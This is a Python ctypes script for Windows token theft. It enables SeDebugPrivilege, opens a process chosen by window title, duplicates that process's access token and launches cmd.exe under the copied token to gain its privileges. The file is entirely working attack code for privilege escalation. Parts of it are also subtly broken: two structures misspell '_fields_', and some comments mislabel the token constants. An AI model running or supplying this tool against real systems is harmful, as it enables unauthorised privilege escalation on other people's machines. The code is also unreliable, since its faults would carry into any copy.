import ctypes
from ctypes.wintypes import ULONG, LONG, DWORD, BOOL, LPVOID, LPSTR, WORD, LPBYTE, HANDLE

u_handle = ctypes.WinDLL("User32.dll")
k_handle = ctypes.WinDLL("kernel32.dll")
adv_handle = ctypes.WinDLL("advapi32.dll")

# cmd path
CMD_PATH = "c:\\Windows\\System32\\cmd.exe"

# Privilege
SE_DEBUG_PRIV = "SeDebugPrivilege"

# Flag for spawning new process
CREATE_NEW_CONSOLE = 0x0010

# Access Rights
PROCESS_ALL_ACCESS = (0x00100000 | 0xF0000 | 0xFFF)

# Source https://referencesource.microsoft.com/#System.IdentityModel/System/IdentityModel/Privilege.cs
SE_PRIVILEGE_DISABLED = 0x0000
SE_PRIVILEGE_ENABLED = 0x0002
SE_PRIVILEGE_REMOVED = 0x0004

# Source token value: https://referencesource.microsoft.com/#System.Workflow.Runtime/DebugEngine/NativeMethods.cs
STANDARD_RIGHTS_REQUIRED = 0x000F0000
STANDARD_RIGHTS_READ = 0x00020000
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_DUPLICATE = 0x0002
TOKEN_IMPERSONATION = 0x0004
TOKEN_QUERY = 0x0008
TOKEN_QUERY_SOURCE = 0x0010
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_ADJUST_GROUPS = 0x0040
TOKEN_ADJUST_DEFAULT = 0x0080
TOKEN_ADJUST_SESSIONID = 0x0100
TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | 
					TOKEN_ASSIGN_PRIMARY     |
					TOKEN_DUPLICATE          |
					TOKEN_IMPERSONATION      |
					TOKEN_QUERY              |
					TOKEN_QUERY_SOURCE       |
					TOKEN_ADJUST_PRIVILEGES  |
					TOKEN_ADJUST_GROUPS      |
					TOKEN_ADJUST_DEFAULT     |
					TOKEN_ADJUST_SESSIONID)

# define LUID structure
class LUID(ctypes.Structure):
    _fields_ = [
        ("LowPart", ULONG),
        ("HighPart", LONG)
    ]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("Luid", LUID),
        ("Attributes", DWORD)
    ]

class PRIVILEGE_SET(ctypes.Structure):
    _fields_ = [
        ("PrivilegeCount", DWORD),
        ("Control", DWORD),
        ("Privilege", LUID_AND_ATTRIBUTES)
    ]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
        ("PrivilegeCount", DWORD),
        ("Privileges", LUID_AND_ATTRIBUTES)
    ]

class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("nLength", DWORD),
        ("lpSecurityDescriptor", LPVOID),
        ("bInheritHandle", BOOL)
    ]

class STARTUPINFOA(ctypes.Structure):
    _field_ = [
        ("cb", DWORD),
        ("lpReserved", LPSTR),
        ("lpDesktop", LPSTR),
        ("lpTitle", LPSTR),
        ("dwX", DWORD),
        ("dwY", DWORD),
        ("dwXSize", DWORD),
        ("dwYSize", DWORD),
        ("dwXCountChars", DWORD),
        ("dwYCountChars", DWORD),
        ("dwFillAtribute", DWORD),
        ("dwFlags", DWORD),
        ("wShowWindow", WORD),
        ("cbReserved2", WORD),
        ("lpReserved2", LPBYTE),
        ("hStdInput", HANDLE),
        ("hStdOutput", HANDLE),
        ("hStdError", HANDLE)
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _field_ = [
        ("hProcess", HANDLE),
        ("hThread", HANDLE),
        ("dwProcessId", DWORD),
        ("dwThreadId", DWORD)
    ]
       

# value in https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/720cea10-cee2-4c45-9084-c6fa7d67d18d
class SECURITY_IMPERSONATION_LEVEL:
    SecurityAnonymous = 0
    SecurityIdentification = 1
    SecurityImpersonation = 2
    SecurityDelegation = 3

class TOKEN_TYPE:
    TokenPrimary = 0
    TokenImpersonation = 1

def findWindowA(window_name):
    print('\t[->] FindWindowA')
    lpClassName = None 
    lpWindowName = ctypes.c_char_p(window_name)  #LPCSTR --> Pointer to string.
    window_handle = u_handle.FindWindowA(lpClassName, lpWindowName)
    if window_handle == 0:
        print('\t\tError code {0} - This window name is not available.'.format(k_handle.GetLastError()))
        exit(1)
    else:
        print('\t\tFindWindow done!!')
        return window_handle

def getWindowThreadProcessId(window_handle):
    print('\t[->] GetWindowThreadProcessId')
    hWnd = window_handle
    dwProcessId = ctypes.c_ulong()
    lpdwProcessId = ctypes.byref(dwProcessId)
    thread_id = u_handle.GetWindowThreadProcessId(hWnd, lpdwProcessId)
    if thread_id == 0:
        print('\t\tError code {0} - GetWindowThreadProcessId failed.'.format(k_handle.GetLastError()))
        exit(1)
    else:
        print('\t\tGetWindowThreadProcessId done!!')
        return dwProcessId

def openProcess(dwProcessId):
    print('\t[->] OpenProcess')
    dwDesiredAccess = PROCESS_ALL_ACCESS
    bInheritHandle = False
    hProcess = k_handle.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId)
    if hProcess == 0:
        print('\t\tError code {0} - OpenProcess failed.'.format(k_handle.GetLastError()))
        exit(1)
    else:
        print('\t\tOpenProcess done!!')
        return hProcess

def openProcessToken(handle):
    print('\t[->] OpenProcessToken')
    ProcessHandle = handle
    DesiredAccess = TOKEN_ALL_ACCESS
    TokenHandle = ctypes.c_void_p()     # void pointer
    response = adv_handle.OpenProcessToken(
        ProcessHandle, 
        DesiredAccess, 
        ctypes.byref(TokenHandle))
    if response == 0:
        print('\t\tError code {0} - OpenProcessToken failed.'.format(k_handle.GetLastError()))
        exit(1)
    else:
        print('\t\tOpen acccess token successfully!!')
        return TokenHandle

def lookupPrivilegeValue(PrivName):
    print('\t[->] LookupPrivilegeValue')
    lpSystemName = None
    lpName = PrivName
    lpLuid = LUID()

    response = adv_handle.LookupPrivilegeValueW(
        lpSystemName, 
        lpName, 
        ctypes.byref(lpLuid))

    if response == 0:
        print('\t\tError code {0} - LookupPrivilegeValue failed.'.format(k_handle.GetLastError()))
        exit(1)
    else:
        print('\t\tLookup privilege {0} successfully!!'.format(lpName))
        return lpLuid

def adjustTokenPrivileges(RequiredPrivileges, TokenHandle):
    print('\t[->] AdjustTokenPrivileges')
    DisableAllPrivileges = False
    NewState = TOKEN_PRIVILEGES()
    NewState.PrivilegeCount = 1
    NewState.Privileges = RequiredPrivileges.Privilege    
    BufferLength = ctypes.sizeof(NewState)
    PreviousState = ctypes.c_void_p()
    ReturnLength = ctypes.c_void_p()

    response = adv_handle.AdjustTokenPrivileges(
        TokenHandle, 
        DisableAllPrivileges, 
        ctypes.byref(NewState), 
        BufferLength, 
        ctypes.byref(PreviousState), 
        ctypes.byref(ReturnLength))

    if response == 0:
        print('\t\tPrivilege {0} is NOT FLIPPED'.format(SE_DEBUG_PRIV))
        return 0
    else:
        return 1

def enablePrivilege(PrivName, TokenHandle):
    ClientToken = TokenHandle
    RequiredPrivileges = PRIVILEGE_SET()
    RequiredPrivileges.PrivilegeCount = 1
    RequiredPrivileges.Privilege = LUID_AND_ATTRIBUTES()
    RequiredPrivileges.Privilege.Luid = LUID()
    
    lpSystemName = None
    lpName = PrivName

    response = adv_handle.LookupPrivilegeValueW(
        lpSystemName,
        lpName,
        ctypes.byref(RequiredPrivileges.Privilege.Luid)
    )

    if response == 0:
        print('\t\tError code {0} - LookupPrivilegeValue failed.'.format(k_handle.GetLastError()))
    else:
        print('\t\tLookup privilege {0} successfully!!'.format(lpName))
    
    pfResult = BOOL()

    response = adv_handle.PrivilegeCheck(
        ClientToken, 
        ctypes.byref(RequiredPrivileges), 
        ctypes.byref(pfResult))

    if response == 0:
        print('\t\tError code {0} - PrivilegeCheck failed.'.format(k_handle.GetLastError()))
        exit(1)

    if pfResult.value == 0:
        print('\tPrivilege {0} is DISABLED'.format(lpName))
        RequiredPrivileges.Privilege.Attributes = SE_PRIVILEGE_ENABLED      # flip attribute
        adjustTokenPrivileges(RequiredPrivileges, TokenHandle)

    print('\t\tPrivilege {0} is ENABLED for current process'.format(SE_DEBUG_PRIV))
    
# enable SeDebugPrivilege for current process (cmd with administrator)
print("[+] Enable SeDebugPrivilege for current process")
CurrentProcessId = k_handle.GetCurrentProcessId()
CurrentProcessTokenHandle = openProcessToken(openProcess(CurrentProcessId))

enablePrivilege("SeDebugPrivilege", CurrentProcessTokenHandle)

# Enter window name
print('[+] Enter window name to hook')
window_name = input().encode('utf-8')

# FindWindowA
window_handle = findWindowA(window_name)

# GetWindowThreadProcessId
dwProcessId = getWindowThreadProcessId(window_handle)

# OpenProcess
hProcess = openProcess(dwProcessId)

# OpenProcessToken of process to hook

TokenHandle = openProcessToken(hProcess)


print('\t[->] DuplicateTokenEx')
# Create a new access token that duplicates an existing token with DuplicateTokenEx
hExistingToken = TokenHandle      
dwDesiredAccess = TOKEN_ALL_ACCESS
lpTokenAttributes = SECURITY_ATTRIBUTES()
ImpersonationLevel = 2 # SECURITY_IMPERSONATION_LEVEL.SecurityIdentification
TokenType = 1 # TOKEN_TYPE.TokenPrimary
phNewToken = ctypes.c_void_p()

lpTokenAttributes.nLength = ctypes.sizeof(lpTokenAttributes)
lpTokenAttributes.lpSecurityDescriptor = ctypes.c_void_p()
lpTokenAttributes.bInheritHandle = False

response = adv_handle.DuplicateTokenEx(
    hExistingToken,
    dwDesiredAccess,
    ctypes.byref(lpTokenAttributes),
    ImpersonationLevel,
    TokenType,
    ctypes.byref(phNewToken)
)

if response == 0:
	print("\t\tCould Not Duplicate Token... Error Code: {0}".format(k_handle.GetLastError()))
	exit(1)
else:
    print('\t\tDuplicateTokenEx done!!')
'''
BOOL CreateProcessWithTokenW(
  HANDLE                hToken,
  DWORD                 dwLogonFlags,
  LPCWSTR               lpApplicationName,
  LPWSTR                lpCommandLine,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCWSTR               lpCurrentDirectory,
  LPSTARTUPINFOW        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
'''
print('\t[->] CreateProcessWithTokenW')
hToken = phNewToken
dwLogonFlags = 0x1
lpApplicationName = CMD_PATH
lpCommandLine = None
dwCreationFlags = 0x10 #CREATE_NEW_CONSOLE
lpEnvironment = ctypes.c_void_p()
lpCurrentDirectory = None
lpStartupInfo = STARTUPINFOA()
lpProcessInformation = PROCESS_INFORMATION()

# Configure Startup Info
lpStartupInfo.wShowWindow = 0x1 # We want the window to show
lpStartupInfo.dwFlags = 0x1 # Use to flag to look at wShowWindow
lpStartupInfo.cb = ctypes.sizeof(lpStartupInfo)


response = adv_handle.CreateProcessWithTokenW(
    hToken,
    dwLogonFlags,
    lpApplicationName,
    lpCommandLine,
    dwCreationFlags,
    lpEnvironment,
    lpCurrentDirectory,
    ctypes.byref(lpStartupInfo),
    ctypes.byref(lpProcessInformation)
)

if response != 0:
    print("\t\tProcess is running!!")
else:
    print("\t\tCreate process failed. Error code {}".format(k_handle.GetLastError()))



